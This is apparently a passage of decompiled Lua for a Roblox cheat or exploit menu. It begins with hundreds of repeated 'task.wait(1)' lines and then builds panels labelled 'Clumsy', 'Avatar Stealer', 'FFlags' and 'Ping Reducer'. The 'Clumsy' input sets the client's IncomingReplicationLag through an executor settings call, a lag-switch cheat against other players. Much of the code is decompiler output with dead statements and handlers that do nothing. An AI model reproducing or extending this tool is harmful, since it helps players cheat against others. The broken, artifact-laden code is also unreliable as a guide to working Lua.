            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
            task.wait(1);
        end);
    end);
end);
local TextButton_30 = Instance.new"TextButton";
TextButton_30.Size = UDim2_New(1, 0, 0, 32);
TextButton_30.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_30.AutoButtonColor = false;
TextButton_30.Text = "";
TextButton_30.ClipsDescendants = true;
TextButton_30.LayoutOrder = 5;
TextButton_30.Parent = Frame_63;
r2796 = Instance.new("UICorner", TextButton_30);
r2796.CornerRadius = UDim_New(0, 5);
local UIStroke_45 = Instance.new"UIStroke";
UIStroke_45.Color = R294_Result_4;
UIStroke_45.Parent = TextButton_30;
local Frame_Buffer = Instance.new"TextLabel";
Frame_Buffer.Size = UDim2_New(1, 0, 0, 32);
Frame_Buffer.Position = UDim2_New(0, 0, 0, 0);
Frame_Buffer.BackgroundTransparency = 1;
Frame_Buffer.Text = "Frame Buffer";
Frame_Buffer.TextColor3 = R294_Result_6;
Frame_Buffer.Font = Enum.Font.GothamBold;
Frame_Buffer.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Frame_Buffer.TextXAlignment = Enum.TextXAlignment.Center;
Frame_Buffer.Parent = TextButton_30;
TextButton_30.MouseButton1Click:Connect(function(a_104, b_104, c_104)
    TweenService:Create(TextButton_30, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_30, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
end);
local Frame_70 = Instance.new"Frame";
Frame_70.BackgroundTransparency = 1;
Frame_70.LayoutOrder = 6;
Frame_70.Parent = Frame_63;
local Clumsy = Instance.new"TextLabel";
Clumsy.Size = UDim2_New(1, 0, 0, 16);
Clumsy.Position = UDim2_New(0, 0, 0, 0);
Clumsy.BackgroundTransparency = 1;
Clumsy.Text = "Clumsy";
Clumsy.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Clumsy.Font = Enum.Font.GothamBold;
Clumsy.TextSize = 12;
Clumsy.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Clumsy.TextXAlignment = Enum.TextXAlignment.Left;
Clumsy.Parent = Frame_70;
local More_Increase_You_Ping = Instance.new"TextLabel";
More_Increase_You_Ping.Size = UDim2_New(1, 0, 0, 0);
More_Increase_You_Ping.Position = UDim2_New(0, 0, 0, 18);
More_Increase_You_Ping.BackgroundTransparency = 1;
More_Increase_You_Ping.Text = "More Increase You ping.";
More_Increase_You_Ping.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
More_Increase_You_Ping.Font = Enum.Font.Gotham;
More_Increase_You_Ping.TextSize = 10;
More_Increase_You_Ping.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
More_Increase_You_Ping.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
More_Increase_You_Ping.TextYAlignment = Enum.TextYAlignment.Top;
More_Increase_You_Ping.Parent = Frame_70;
game:GetService("TextService");
local _ = Enum.Font.Gotham;
local More_Increase_You_Ping_2 = TextService:GetTextSize(
    "More Increase You ping.",
    9,
    Enum.Font.Gotham,
    r1340(
    Frame_63.AbsoluteSize.X - 16,
    1e3
)
);
More_Increase_You_Ping.Size = UDim2_New(1, 0, 0, More_Increase_You_Ping_2.Y);
local r2847 = (
    16 + More_Increase_You_Ping_2.Y
) + 6;
local Frame_71 = Instance.new"Frame";
Frame_71.Size = UDim2_New(1, 0, 0, 28);
Frame_71.Position = UDim2_New(0, 0, 0, r2847);
Frame_71.BackgroundColor3 = FromRGB(22, 22, 26);
Frame_71.BorderSizePixel = 0;
Frame_71.Parent = Frame_70;
r2855 = Instance.new("UICorner", Frame_71);
r2855.CornerRadius = UDim_New(0, 5);
local UIStroke_46 = Instance.new"UIStroke";
UIStroke_46.Color = R294_Result_4;
UIStroke_46.Thickness = 1;
UIStroke_46.Parent = Frame_71;
local TextBox_4 = Instance.new"TextBox";
TextBox_4.Size = UDim2_New(1, -16, 1, 0);
TextBox_4.Position = UDim2_New(0, 8, 0, 0);
TextBox_4.BackgroundTransparency = 1;
TextBox_4.PlaceholderText = "0";
TextBox_4.PlaceholderColor3 = R294_Result_7;
TextBox_4.Text = "";
TextBox_4.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
TextBox_4.Font = Enum.Font.Gotham;
TextBox_4.TextSize = 10;
TextBox_4.ClearTextOnFocus = false;
local _ = Enum.TextXAlignment.Left;
TextBox_4.TextXAlignment = Enum.TextXAlignment.Left;
TextBox_4.Parent = Frame_71;
Frame_70.Size = UDim2_New(
    1,
    0,
    0,
    r2847 + 32
);
TextBox_4.Focused:Connect(function(a_105, b_105, c_105)
    TweenService:Create(UIStroke_46, r1036(0.2), {
        ["Color"] = R294_Result_5
    }):Play();
    r1040:Play();
end);
TextBox_4.FocusLost:Connect(function(enterPressed_2, a_106, b_106, c_106)
    TweenService:Create(UIStroke_46, r1036(0.2), {
        ["Color"] = R294_Result_4
    }):Play();
    r1040:Play();
    pcall(function(p1_107, a_107, b_107, c_107)
        fenv.settings():GetService("NetworkSettings").IncomingReplicationLag = TextBox_4.Text;
    end);
end);
game:GetService("Players");
local Frame_72 = Instance.new"Frame";
Frame_72.BackgroundTransparency = 1;
Frame_72.LayoutOrder = 1;
Frame_72.Parent = Frame_65;
local Avatar_Stealer_2 = Instance.new"TextLabel";
Avatar_Stealer_2.Size = UDim2_New(1, 0, 0, 16);
Avatar_Stealer_2.Position = UDim2_New(0, 0, 0, 0);
Avatar_Stealer_2.BackgroundTransparency = 1;
Avatar_Stealer_2.Text = "Avatar Stealer";
Avatar_Stealer_2.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Avatar_Stealer_2.Font = Enum.Font.GothamBold;
Avatar_Stealer_2.TextSize = 12;
Avatar_Stealer_2.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
Avatar_Stealer_2.TextXAlignment = Enum.TextXAlignment.Left;
Avatar_Stealer_2.Parent = Frame_72;
local Set_Nickname_Of_User = Instance.new"TextLabel";
Set_Nickname_Of_User.Size = UDim2_New(1, 0, 0, 0);
Set_Nickname_Of_User.Position = UDim2_New(0, 0, 0, 18);
Set_Nickname_Of_User.BackgroundTransparency = 1;
Set_Nickname_Of_User.Text = "Set Nickname of user";
Set_Nickname_Of_User.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Set_Nickname_Of_User.Font = Enum.Font.Gotham;
Set_Nickname_Of_User.TextSize = 10;
Set_Nickname_Of_User.TextWrapped = true;
local _ = Enum.TextXAlignment.Left;
Set_Nickname_Of_User.TextXAlignment = Enum.TextXAlignment.Left;
local _ = Enum.TextYAlignment.Top;
Set_Nickname_Of_User.TextYAlignment = Enum.TextYAlignment.Top;
Set_Nickname_Of_User.Parent = Frame_72;
game:GetService("TextService");
local _ = Enum.Font.Gotham;
local Set_Nickname_Of_User_2 = TextService:GetTextSize(
    "Set Nickname of user",
    9,
    Enum.Font.Gotham,
    r1340(
    Frame_65.AbsoluteSize.X - 16,
    1e3
)
);
Set_Nickname_Of_User.Size = UDim2_New(1, 0, 0, Set_Nickname_Of_User_2.Y);
local r2917 = (
    16 + Set_Nickname_Of_User_2.Y
) + 6;
local Frame_73 = Instance.new"Frame";
Frame_73.Size = UDim2_New(1, 0, 0, 28);
Frame_73.Position = UDim2_New(0, 0, 0, r2917);
Frame_73.BackgroundColor3 = FromRGB(22, 22, 26);
Frame_73.BorderSizePixel = 0;
Frame_73.Parent = Frame_72;
r2925 = Instance.new("UICorner", Frame_73);
r2925.CornerRadius = UDim_New(0, 5);
local UIStroke_47 = Instance.new"UIStroke";
UIStroke_47.Color = R294_Result_4;
UIStroke_47.Thickness = 1;
UIStroke_47.Parent = Frame_73;
local TextBox_5 = Instance.new"TextBox";
TextBox_5.Size = UDim2_New(1, -16, 1, 0);
TextBox_5.Position = UDim2_New(0, 8, 0, 0);
TextBox_5.BackgroundTransparency = 1;
TextBox_5.PlaceholderText = "";
TextBox_5.PlaceholderColor3 = R294_Result_7;
TextBox_5.Text = "";
TextBox_5.TextColor3 = R294_Result_6;
local _ = Enum.Font.Gotham;
TextBox_5.Font = Enum.Font.Gotham;
TextBox_5.TextSize = 10;
TextBox_5.ClearTextOnFocus = false;
local _ = Enum.TextXAlignment.Left;
TextBox_5.TextXAlignment = Enum.TextXAlignment.Left;
TextBox_5.Parent = Frame_73;
Frame_72.Size = UDim2_New(
    1,
    0,
    0,
    r2917 + 32
);
TextBox_5.Focused:Connect(function(a_108, b_108, c_108)
    TweenService:Create(UIStroke_47, r1036(0.2), {
        ["Color"] = R294_Result_5
    }):Play();
    r1040:Play();
end);
TextBox_5.FocusLost:Connect(function(enterPressed_3, a_109, b_109, c_109)
    TweenService:Create(UIStroke_47, r1036(0.2), {
        ["Color"] = R294_Result_4
    }):Play();
    r1040:Play();
    R2929_Text = TextBox_5.Text;
    pcall(function(p1_110, a_110, b_110, c_110)
        string.gsub(R2929_Text, "^%s*(.-)%s*$", "%1");
    end);
end);
local TextButton_31 = Instance.new"TextButton";
TextButton_31.Size = UDim2_New(1, 0, 0, 40);
TextButton_31.BackgroundTransparency = 1;
TextButton_31.Text = "";
TextButton_31.AutoButtonColor = false;
TextButton_31.Parent = ScrollingFrame;
local Frame_74 = Instance.new"Frame";
Frame_74.Size = UDim2_New(0, 3, 0, 22);
Frame_74.Position = UDim2_New(0, 0, 0.5, -11);
Frame_74.BackgroundColor3 = R294_Result_5;
Frame_74.BackgroundTransparency = 1;
Frame_74.Parent = TextButton_31;
r2955 = Instance.new("UICorner", Frame_74);
r2955.CornerRadius = UDim_New(1, 0);
local FFlags = Instance.new"TextLabel";
FFlags.Size = UDim2_New(1, -12, 0, 18);
FFlags.Position = UDim2_New(0, 12, 0, 4);
FFlags.BackgroundTransparency = 1;
FFlags.Text = "FFlags";
FFlags.TextColor3 = R294_Result_7;
local _ = Enum.Font.GothamBold;
FFlags.Font = Enum.Font.GothamBold;
FFlags.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
FFlags.TextXAlignment = Enum.TextXAlignment.Left;
FFlags.Parent = TextButton_31;
local Change_Server_Stuff_You = Instance.new"TextLabel";
Change_Server_Stuff_You.Size = UDim2_New(1, -12, 0, 14);
Change_Server_Stuff_You.Position = UDim2_New(0, 12, 0, 21);
Change_Server_Stuff_You.BackgroundTransparency = 1;
Change_Server_Stuff_You.Text = "Change server stuff, you...";
Change_Server_Stuff_You.TextColor3 = R294_Result_7;
local _ = Enum.Font.Gotham;
Change_Server_Stuff_You.Font = Enum.Font.Gotham;
Change_Server_Stuff_You.TextSize = 11;
local _ = Enum.TextXAlignment.Left;
Change_Server_Stuff_You.TextXAlignment = Enum.TextXAlignment.Left;
Change_Server_Stuff_You.Parent = TextButton_31;
local Frame_75 = Instance.new"Frame";
Frame_75.Size = UDim2_New(1, 0, 1, 0);
Frame_75.BackgroundTransparency = 1;
Frame_75.Visible = false;
Frame_75.Parent = Frame_3;
local ScrollingFrame_15 = Instance.new"ScrollingFrame";
ScrollingFrame_15.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_15.Position = UDim2_New(0, 6, 0, 5);
ScrollingFrame_15.BackgroundTransparency = 1;
ScrollingFrame_15.ScrollBarThickness = 1;
ScrollingFrame_15.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_15.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_15.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_15.Parent = Frame_75;
local UIListLayout_28 = Instance.new"UIListLayout";
UIListLayout_28.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_28.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_28.Parent = ScrollingFrame_15;
local ScrollingFrame_16 = Instance.new"ScrollingFrame";
ScrollingFrame_16.Size = UDim2_New(0.5, -8, 1, -10);
ScrollingFrame_16.Position = UDim2_New(0.5, 2, 0, 5);
ScrollingFrame_16.BackgroundTransparency = 1;
ScrollingFrame_16.ScrollBarThickness = 1;
ScrollingFrame_16.ScrollBarImageColor3 = R294_Result_5;
ScrollingFrame_16.CanvasSize = UDim2_New(0, 0, 0, 0);
local _ = Enum.AutomaticSize.Y;
ScrollingFrame_16.AutomaticCanvasSize = Enum.AutomaticSize.Y;
ScrollingFrame_16.Parent = Frame_75;
local UIListLayout_29 = Instance.new"UIListLayout";
UIListLayout_29.Padding = UDim_New(0, 8);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_29.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_29.Parent = ScrollingFrame_16;
TextButton_31.MouseButton1Click:Connect(function(a_111, b_111, c_111)
    local _ = TextButton_18 == TextButton_31;
    TweenService:Create(Frame_56, r1036(0.2), {
        ["BackgroundTransparency"] = 1
    }):Play();
    r1040:Play();
    TweenService:Create(Miscellaneous, r1036(0.2), {
        ["TextColor3"] = R294_Result_7
    }):Play();
    r1040:Play();
    Frame_57.Visible = false;
    TweenService:Create(Frame_74, r1036(0.2), {
        ["BackgroundTransparency"] = 0
    }):Play();
    r1040:Play();
    TweenService:Create(FFlags, r1036(0.2), {
        ["TextColor3"] = R294_Result_6
    }):Play();
    r1040:Play();
    Frame_75.Visible = true;
end);
local Frame_76 = Instance.new"Frame";
Frame_76.Size = UDim2_New(1, 0, 0, 30);
Frame_76.BackgroundColor3 = R294_Result_3;
Frame_76.BorderSizePixel = 0;
ScrollingFrame_15:GetChildren();
Frame_76.LayoutOrder = 0;
Frame_76.Parent = ScrollingFrame_15;
r3015 = Instance.new("UICorner", Frame_76);
r3015.CornerRadius = UDim_New(0, 6);
local UIStroke_48 = Instance.new"UIStroke";
UIStroke_48.Color = R294_Result_4;
UIStroke_48.Parent = Frame_76;
local FFlags_Main = Instance.new"TextLabel";
FFlags_Main.Size = UDim2_New(1, -16, 0, 26);
FFlags_Main.Position = UDim2_New(0, 8, 0, 2);
FFlags_Main.BackgroundTransparency = 1;
FFlags_Main.Text = "FFlags Main";
FFlags_Main.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
FFlags_Main.Font = Enum.Font.GothamBold;
FFlags_Main.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
FFlags_Main.TextXAlignment = Enum.TextXAlignment.Left;
FFlags_Main.Parent = Frame_76;
local Frame_77 = Instance.new"Frame";
Frame_77.Size = UDim2_New(1, 0, 1, -28);
Frame_77.Position = UDim2_New(0, 0, 0, 28);
Frame_77.BackgroundTransparency = 1;
Frame_77.Parent = Frame_76;
local UIListLayout_30 = Instance.new"UIListLayout";
UIListLayout_30.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_30.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_30.Parent = Frame_77;
local UIPadding_23 = Instance.new"UIPadding";
UIPadding_23.PaddingLeft = UDim_New(0, 8);
UIPadding_23.PaddingRight = UDim_New(0, 8);
UIPadding_23.PaddingBottom = UDim_New(0, 8);
UIPadding_23.Parent = Frame_77;
UIListLayout_30:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_112, b_112, c_112)
    Frame_76.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_30.AbsoluteContentSize.Y + 36
    );
end);
local TextButton_32 = Instance.new"TextButton";
TextButton_32.Size = UDim2_New(1, 0, 0, 32);
TextButton_32.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_32.AutoButtonColor = false;
TextButton_32.Text = "";
TextButton_32.ClipsDescendants = true;
TextButton_32.LayoutOrder = 1;
TextButton_32.Parent = Frame_77;
r3054 = Instance.new("UICorner", TextButton_32);
r3054.CornerRadius = UDim_New(0, 5);
local UIStroke_49 = Instance.new"UIStroke";
UIStroke_49.Color = R294_Result_4;
UIStroke_49.Parent = TextButton_32;
local Ping_Reducer = Instance.new"TextLabel";
Ping_Reducer.Size = UDim2_New(1, 0, 0, 32);
Ping_Reducer.Position = UDim2_New(0, 0, 0, 0);
Ping_Reducer.BackgroundTransparency = 1;
Ping_Reducer.Text = "Ping Reducer";
Ping_Reducer.TextColor3 = R294_Result_6;
Ping_Reducer.Font = Enum.Font.GothamBold;
Ping_Reducer.TextSize = 11;
local _ = Enum.TextXAlignment.Center;
Ping_Reducer.TextXAlignment = Enum.TextXAlignment.Center;
Ping_Reducer.Parent = TextButton_32;
TextButton_32.MouseButton1Click:Connect(function(a_113, b_113, c_113)
    TweenService:Create(TextButton_32, r1036(0.08), {
        ["Position"] = UDim2_New(0, 2, 0, 1.5),
        ["Size"] = UDim2_New(1, -4, 0, 29)
    }):Play();
    r1040:Play();
    task.wait(0.12);
    TweenService:Create(TextButton_32, r1036(0.15), {
        ["Position"] = UDim2_New(0, 0, 0, 0),
        ["Size"] = UDim2_New(1, 0, 0, 32)
    }):Play();
    r1040:Play();
    pcall(function(a_114, b_114, c_114)
        task.spawn(function()
            workspace:GetDescendants();
        end);
    end);
end);
local Frame_78 = Instance.new"Frame";
Frame_78.Size = UDim2_New(1, 0, 0, 30);
Frame_78.BackgroundColor3 = R294_Result_3;
Frame_78.BorderSizePixel = 0;
ScrollingFrame_16:GetChildren();
Frame_78.LayoutOrder = 0;
Frame_78.Parent = ScrollingFrame_16;
r3073 = Instance.new("UICorner", Frame_78);
r3073.CornerRadius = UDim_New(0, 6);
local UIStroke_50 = Instance.new"UIStroke";
UIStroke_50.Color = R294_Result_4;
UIStroke_50.Parent = Frame_78;
local Misc_Game = Instance.new"TextLabel";
Misc_Game.Size = UDim2_New(1, -16, 0, 26);
Misc_Game.Position = UDim2_New(0, 8, 0, 2);
Misc_Game.BackgroundTransparency = 1;
Misc_Game.Text = "Misc-Game";
Misc_Game.TextColor3 = R294_Result_6;
local _ = Enum.Font.GothamBold;
Misc_Game.Font = Enum.Font.GothamBold;
Misc_Game.TextSize = 13;
local _ = Enum.TextXAlignment.Left;
Misc_Game.TextXAlignment = Enum.TextXAlignment.Left;
Misc_Game.Parent = Frame_78;
local Frame_79 = Instance.new"Frame";
Frame_79.Size = UDim2_New(1, 0, 1, -28);
Frame_79.Position = UDim2_New(0, 0, 0, 28);
Frame_79.BackgroundTransparency = 1;
Frame_79.Parent = Frame_78;
local UIListLayout_31 = Instance.new"UIListLayout";
UIListLayout_31.Padding = UDim_New(0, 6);
local _ = Enum.SortOrder.LayoutOrder;
UIListLayout_31.SortOrder = Enum.SortOrder.LayoutOrder;
UIListLayout_31.Parent = Frame_79;
local UIPadding_24 = Instance.new"UIPadding";
UIPadding_24.PaddingLeft = UDim_New(0, 8);
UIPadding_24.PaddingRight = UDim_New(0, 8);
UIPadding_24.PaddingBottom = UDim_New(0, 8);
UIPadding_24.Parent = Frame_79;
UIListLayout_31:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function(a_115, b_115, c_115)
    Frame_78.Size = UDim2_New(
        1,
        0,
        0,
        UIListLayout_31.AbsoluteContentSize.Y + 36
    );
end);
local Frame_80 = Instance.new"Frame";
Frame_80.Size = UDim2_New(1, 0, 0, 25);
Frame_80.BackgroundTransparency = 1;
Frame_80.LayoutOrder = 1;
Frame_80.Parent = Frame_79;
local TextLabel_8 = Instance.new"TextLabel";
TextLabel_8.Size = UDim2_New(1, 0, 1, 0);
TextLabel_8.BackgroundTransparency = 1;
TextLabel_8.Text = "Coming In <font color='#FF4C4C'>Soon...</font>";
TextLabel_8.TextColor3 = R294_Result_6;
TextLabel_8.RichText = true;
TextLabel_8.Font = Enum.Font.GothamBold;
TextLabel_8.TextSize = 12;
TextLabel_8.TextTransparency = 0.2;
local _ = Enum.TextXAlignment.Left;
TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left;
TextLabel_8.Parent = Frame_80;
local TextButton_33 = Instance.new"TextButton";
TextButton_33.Size = UDim2_New(1, 0, 0, 32);
TextButton_33.BackgroundColor3 = FromRGB(27, 27, 27);
TextButton_33.AutoButtonColor = false;
TextButton_33.Text = "";
TextButton_33.ClipsDescendants = true;
TextButton_33.LayoutOrder = 2;
TextButton_33.Parent = Frame_77;
r3120 = Instance.new("UICorner", TextButton_33);
